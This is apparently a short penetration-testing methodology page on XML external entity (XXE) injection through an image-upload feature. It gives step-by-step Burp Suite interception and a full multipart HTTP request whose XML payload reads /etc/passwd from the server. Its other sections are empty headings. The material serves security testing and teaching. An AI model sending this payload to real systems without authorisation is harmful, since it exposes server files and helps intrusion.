# XML Injection

## Check List

## Methodology

### Black Box

#### [XXE In Filename](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XXE%20Injection/Intruders/xml-attacks.txt)

{% stepper %}
{% step %}
Log in to a user account and navigate to the profile or settings page with an image upload feature, capturing the upload request with Burp Suite
{% endstep %}

{% step %}
Intercept the POST request to the upload endpoint (`/upload`,) and locate the file type parameter or file extension in filename
{% endstep %}

{% step %}
then change the file extension from `.jpg` to `.html` or `.xml` while keeping image content
{% endstep %}

{% step %}
Upload a malicious XML file with an external entity like

```http
POST /upload HTTP/1.1
Host: example.com
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Length: XXX

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="exploit.xml"
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
------WebKitFormBoundary--
```
{% endstep %}

{% step %}
If the server response shows content from the `etc/passwd` file, the vulnerability has been registered
{% endstep %}
{% endstepper %}

***

### White Box

## Cheat Sheet
